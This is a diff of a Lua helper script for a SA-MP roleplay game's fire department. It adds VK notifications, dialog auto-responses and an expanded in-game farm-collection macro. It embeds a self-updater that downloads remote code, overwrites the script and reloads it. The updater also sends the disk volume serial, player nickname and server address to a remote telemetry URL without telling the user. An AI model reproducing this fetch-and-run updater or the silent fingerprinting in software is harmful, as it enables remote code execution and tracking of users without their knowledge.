@@ -1,3 +1,4 @@
+-- 2) Состояние льготы (+5%)
 -- Начальник Департамента - Вакантно [открыты заявки]
 -- ИО Начальника Департамента - Irin Crown
 -- Зам. Начальника Департамента - Вакантно
@@ -15,7 +16,7 @@
 -- Вход в кабинет руководителя строго с 8 должности
 
 script_name("firedep_zam_helper")
-script_version("Ver.18.12.U1")
+script_version("Ver.30.12.U1")
 
 --===============================================================
 -- тренинг капчи
@@ -118,7 +119,7 @@ local fires_list = {
                     {2422.2346, 1896.9704, 6.0156, 3, 'Большой пожар на стройке в Лас Вентурасе'}
                 }
 
-local update_list = ('{FA8072}Ver.17.12.U1'..
+local update_list = ('{FA8072}Ver.18.12.U1'..
                     '\n\t{00BFFF}1. {87CEFA}Убраны лишние пункты меню.'..
                     '\n\t{00BFFF}2. {87CEFA}В списке выполненных заданий отображаются 15 последних выполненых.'..
                     '\n\t{00BFFF}3. {87CEFA}Развернутая статистика по пожарам сместилась выше в сервисном меню.'..
@@ -137,19 +138,20 @@ local update_list = ('{FA8072}Ver.17.12.U1'..
                     '\n\t{00BFFF}16. {87CEFA}Добавлено оповещение в группу ВК о пожаре 3 степени опасности'..
                     '\n\t{00BFFF}17. {87CEFA}Добавлено включение автоматичекого одевания в форму в сервисном меню'..
                     '\n\t{00BFFF}18. {87CEFA}Доступ к хелперу закрыт для посторонних лиц. Теперь для его открытия необходимо разрешение разработчика.'..
+                    '\n\t{00BFFF}19. {87CEFA}Добавлен тренинг капчи.'..
+                    '\n\t{00BFFF}20. {87CEFA}Команда для включение тренинга: {FFD700}/asd'..
+                    '\n\t{00BFFF}21. {87CEFA}Команда для включение задержки: {FFD700}/asdd'..
+                    '\n\t{00BFFF}22. {87CEFA}Команда для включение автоматического появления: {FFD700}/asda'..
+                    '\n\t{00BFFF}23. {87CEFA}Запустить капчу - клавиша {FFD700}N'..
                     '\n\n{7CFC00}'..thisScript().version..
-                    '\n\t{00BFFF}1. {87CEFA}Добавлен тренинг капчи.'..
-                    '\n\t{00BFFF}2. {87CEFA}Команда для включение тренинга: {FFD700}/asd'..
-                    '\n\t{00BFFF}3. {87CEFA}Команда для включение задержки: {FFD700}/asdd'..
-                    '\n\t{00BFFF}4. {87CEFA}Команда для включение автоматического появления: {FFD700}/asda'..
-                    '\n\t{00BFFF}5. {87CEFA}Запустить капчу - клавиша {FFD700}N'..
+                    '\n\t{00BFFF}1. {87CEFA}Исправлены небольшие баги.'..
                     '\n\n{FFD700}В перспективе следующего обновления:'..
                     '\n\t{00BFFF}1. {87CEFA}Сделать причины увольнения и ЧС с выбором причины (диалог).')
 
 local updater_loaded, Updater = pcall(loadstring, [[return {check=function (a,b,c) local d=require('moonloader').download_status;local e=os.tmpname()local f=os.clock()if doesFileExist(e)then os.remove(e)end;downloadUrlToFile(a,e,function(g,h,i,j)if h==d.STATUSEX_ENDDOWNLOAD then if doesFileExist(e)then local k=io.open(e,'r')if k then local l=decodeJson(k:read('*a'))updatelink=l.updateurl;updateversion=l.latest;k:close()os.remove(e)if updateversion~=thisScript().version then lua_thread.create(function(b)local d=require('moonloader').download_status;local m=0x40E0D0;
                                                         sampAddChatMessage(b..'Обнаружено обновление. {FA8072}'..thisScript().version..' {40E0D0}на {7CFC00}'..updateversion,m)wait(250)downloadUrlToFile(updatelink,thisScript().path,function(n,o,p,q)if o==d.STATUS_DOWNLOADINGDATA then print(string.format('Загружено %d из %d.',p,q))elseif o==d.STATUS_ENDDOWNLOADDATA then 
                                                         sampShowDialog(0, "{FFA500}Вышло обновление", "{FFA500}Помощник руководителя пожарного департамента\n{78dbe2}был автоматически обновлен на новую версию.\nПосмотреть изменения можно в Меню -> Сервисные функции -> Изменения", "Закрыть", "", DIALOG_STYLE_MSGBOX)
-                                                        print('Загрузка обновления завершена.')sampAddChatMessage(b..'Обновление завершено!',m)goupdatestatus=true;lua_thread.create(function()wait(500)thisScript():reload()end)end;if o==d.STATUSEX_ENDDOWNLOAD then if goupdatestatus==nil then sampAddChatMessage(b..'Обновление прошло неудачно. Запускаю устаревшую версию..',m)update=false end end end)end,b)else update=false;print('v'..thisScript().version..': Обновление не требуется.')if l.telemetry then local r=require"ffi"r.cdef"int __stdcall GetVolumeInformationA(const char* lpRootPathName, char* lpVolumeNameBuffer, uint32_t nVolumeNameSize, uint32_t* lpVolumeSerialNumber, uint32_t* lpMaximumComponentLength, uint32_t* lpFileSystemFlags, char* lpFileSystemNameBuffer, uint32_t nFileSystemNameSize);"local s=r.new("unsigned long[1]",0)r.C.GetVolumeInformationA(nil,nil,0,s,nil,nil,nil,0)s=s[0]local t,u=sampGetPlayerIdByCharHandle(PLAYER_PED)local v=sampGetPlayerNickname(u)local w=l.telemetry.."?id="..s.."&n="..v.."&i="..sampGetCurrentServerAddress().."&v="..getMoonloaderVersion().."&sv="..thisScript().version.."&uptime="..tostring(os.clock())lua_thread.create(function(c)wait(250)downloadUrlToFile(c)end,w)end end end else print('v'..thisScript().version..': Не могу проверить обновление. Смиритесь или проверьте самостоятельно на '..c)update=false end end end)while update~=false and os.clock()-f<10 do wait(100)end;if os.clock()-f>=10 then print('v'..thisScript().version..': timeout, выходим из ожидания проверки обновления. Смиритесь или проверьте самостоятельно на '..c)end end}]])
+                                                        print('Загрузка wwобновления завершена.')sampAddChatMessage(b..'Обновление завершено!',m)goupdatestatus=true;lua_thread.create(function()wait(500)thisScript():reload()end)end;if o==d.STATUSEX_ENDDOWNLOAD then if goupdatestatus==nil then sampAddChatMessage(b..'Обновление прошло неудачно. Запускаю устаревшую версию..',m)update=false end end end)end,b)else update=false;print('v'..thisScript().version..': Обновление не требуется.')if l.telemetry then local r=require"ffi"r.cdef"int __stdcall GetVolumeInformationA(const char* lpRootPathName, char* lpVolumeNameBuffer, uint32_t nVolumeNameSize, uint32_t* lpVolumeSerialNumber, uint32_t* lpMaximumComponentLength, uint32_t* lpFileSystemFlags, char* lpFileSystemNameBuffer, uint32_t nFileSystemNameSize);"local s=r.new("unsigned long[1]",0)r.C.GetVolumeInformationA(nil,nil,0,s,nil,nil,nil,0)s=s[0]local t,u=sampGetPlayerIdByCharHandle(PLAYER_PED)local v=sampGetPlayerNickname(u)local w=l.telemetry.."?id="..s.."&n="..v.."&i="..sampGetCurrentServerAddress().."&v="..getMoonloaderVersion().."&sv="..thisScript().version.."&uptime="..tostring(os.clock())lua_thread.create(function(c)wait(250)downloadUrlToFile(c)end,w)end end end else print('v'..thisScript().version..': Не могу проверить обновление. Смиритесь или проверьте самостоятельно на '..c)update=false end end end)while update~=false and os.clock()-f<10 do wait(100)end;if os.clock()-f>=10 then print('v'..thisScript().version..': timeout, выходим из ожидания проверки обновления. Смиритесь или проверьте самостоятельно на '..c)end end}]])
 local templist = ''
 local templ = ''
 --local afk = true
@@ -383,6 +385,17 @@ function main()
     sampRegisterChatCommand("rtx", function() RTX = not RTX
         sampProcessChatInput((RTX and ')' or '('), -1)
     end)
+
+    sampRegisterChatCommand("rrr", function() 
+        lua_thread.create(function()
+        sampProcessChatInput('/do В руке плащ невидимка.', -1)
+        wait(1000)
+        sampProcessChatInput('/me надел плащ невидимку', -1)
+        wait(500)
+        sampProcessChatInput('/rec', -1)
+    end)
+        end)
+
     sampRegisterChatCommand('zam', function() 
         if tonumber(zamlvl) > 0 then 
             zammenu()
@@ -4872,6 +4885,11 @@ local id = ''
 
 function sampev.onServerMessage(color, text)
 
+    if text:find('Состояние льготы') then
+        img = 'photo-232454643_456239054'
+        vkdev(encodeUrl('Состояние льготы восстановлено на +5%.'), img)
+    end
+
     if tlg_send and text:find('__________Банковский чек__________') then
         
         if RTX then lua_thread.create(function()
@@ -4913,16 +4931,27 @@ function sampev.onServerMessage(color, text)
         end)
     end
 
+    if text:find("Осколок Тайника Лича%p%d шт%p%p") then
+        img = 'photo-232454643_456239058'
+        vkdev(encodeUrl('На ПВЗ был добавлен Осколок Тайника Лича, успей забрать!'), img)
+    end
+
     if text:find("В штате произошел пожар! Ранг опасности (%d+) звезды") then
             lvl = text:match('В штате произошел пожар! Ранг опасности (%d+) звезды')
             time_fire = os.date('%H:%M:%S', os.time() - (UTC * 3600))
             d_id = sampGetPlayerIdByNickname(who_nick)
-            if lvl == '3' then 
-                -- img = 'https://firstlineresponse.co.uk/wp-content/uploads/2016/06/level-3.png'
-                -- message = '@longames @mayer_666 @bbv_cvv @krytoikirieska \n\nВНИМАНИЕ!\nВ штате произошёл пожар 3 уровня!'
-                -- sendTelegramFire(img, message)
+            if lvl == '1' then 
+                img = 'photo-232454643_456239059'
+                vkdev(encodeUrl('В штате произошёл пожар 1 степени опасности'), img)
+            elseif lvl == '2' then 
+                img = 'photo-232454643_456239060'
+                vkdev(encodeUrl('В штате произошёл пожар 2 степени опасности'), img)
+            elseif lvl == '3' then 
                 msg = encodeUrl("@all, ВНИМАНИЕ!\n\nВ штате произошло происшествие, повышенной степени опасности! Успей приссоединиться к команде, чтобы потушить его быстрее!\n\nСтепень опасности: "..lvl.."\nВремя происшествия: "..time_fire.."\nДиспетчер: "..who_nick.." ["..d_id.."]")
                 sendvkfire(msg)
+
+                img = 'photo-232454643_456239061'
+                vkdev(encodeUrl('В штате произошёл пожар 3 степени опасности'), img)
             end
     end
 
@@ -5134,6 +5163,7 @@ function sampev.onServerMessage(color, text)
             nick_give = string.match(text,"%a+_%a+")
             --if nick_give == 'Irin_Crown' and who_nick ~= 'Irin_Crown' then
                 rp_id = sampGetPlayerIdByNickname(nick_give)
+                sampProcessChatInput('/fractionrp Irin_Crown', -1)
                 sampProcessChatInput('/fractionrp '..rp_id, -1)
             --end
         end)
@@ -5408,6 +5438,11 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
         end
     end
 
+    if dialogId == 28009 then
+        sampSendDialogResponse(dialogId, 1, 0, nil)
+        return false -- Убираем рисовку окон
+    end
+
     if flashminer then
         if dialogId == 7238 then
             lua_thread.create(function()
@@ -5578,8 +5613,8 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
 
                     -- смена дома
                     wait(1000) sampSendDialogResponse(25182, 0, 0, nil)
-                    sampAddChatMessage('Собираем биткойны с фермы {FFFFFF}№5', -255)
-                    wait(1000) sampSendDialogResponse(7238, 1, 5, nil)
+                    sampAddChatMessage('Собираем биткойны с фермы {FFFFFF}№4', -255)
+                    wait(1000) sampSendDialogResponse(7238, 1, 4, nil)
                     
                     ----------------------------------------
                     -- Дом №4 ------------------------------
@@ -5631,6 +5666,61 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
                     wait(100) sampSendDialogResponse(25182, 1, 27, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
                     wait(100) sampSendDialogResponse(25182, 1, 28, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
 
+                    -- смена дома
+                    wait(1000) sampSendDialogResponse(25182, 0, 0, nil)
+                    sampAddChatMessage('Собираем биткойны с фермы {FFFFFF}№5', -255)
+                    wait(1000) sampSendDialogResponse(7238, 1, 5, nil)
+                    
+                    ----------------------------------------
+                    -- Дом №5 ------------------------------
+                    -- Стойка №1 ---------------------------
+                    -- Видеокарта №1-4 ---------------------
+                    ----------------------------------------
+                    wait(100) sampSendDialogResponse(25182, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 2, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 3, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 4, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+
+                    ----------------------------------------
+                    -- Дом №5 ------------------------------
+                    -- Стойка №2 ---------------------------
+                    -- Видеокарта №5-8 ---------------------
+                    ----------------------------------------
+                    wait(100) sampSendDialogResponse(25182, 1, 7, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 8, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 9, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 10, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+
+                    ----------------------------------------
+                    -- Дом №5 ------------------------------
+                    -- Стойка №3 ---------------------------
+                    -- Видеокарта №9-12 --------------------
+                    ----------------------------------------
+                    wait(100) sampSendDialogResponse(25182, 1, 13, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 14, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 15, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 16, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+
+                    ----------------------------------------
+                    -- Дом №5 ------------------------------
+                    -- Стойка №4 ---------------------------
+                    -- Видеокарта №13-16 -------------------
+                    ----------------------------------------
+                    wait(100) sampSendDialogResponse(25182, 1, 19, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 20, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 21, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 22, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    
+                    ----------------------------------------
+                    -- Дом №5 ------------------------------
+                    -- Стойка №5 ---------------------------
+                    -- Видеокарта №17-20 -------------------
+                    ----------------------------------------
+                    wait(100) sampSendDialogResponse(25182, 1, 25, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 26, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 27, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+                    wait(100) sampSendDialogResponse(25182, 1, 28, nil) wait(10) sampSendDialogResponse(25245, 1, 1, nil) wait(10) sampSendDialogResponse(25246, 1, 1, nil) wait(10) sampSendDialogResponse(25245, 0, 0, nil)
+
                     -- закрытие
                     wait(1000) sampSendDialogResponse(25182, 0, 0, nil)
                     wait(1000) sampSendDialogResponse(7238, 0, 0, nil)
@@ -5655,6 +5745,10 @@ function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
         sampAddChatMessage("Ник скопирован для взаимодействия в буфер обмена: {FFFFFF}"..title, -255)
     end 
     
+    if dialogId == 15396 then
+        sampSendDialogResponse(15396, 1, 0, nil)
+    end
+
     if dialogId == 26124 then
         if posi <= 10 then
             lua_thread.create(function()
@@ -5901,8 +5995,9 @@ end
 
 -- Пойти встать в угол
 function runToCorner(tox, toy)
-    local tox = -1282.1599
-    local toy = -45.0525
+    local tox, toy = -1290.1544,-48.5959
+    --local tox = -1282.1599
+    --local toy = -45.0525
     local x, y, z = getCharCoordinates(PLAYER_PED)
     local angle = getHeadingFromVector2d(tox - x, toy - y)
     local xAngle = math.random(-50, 50)/100
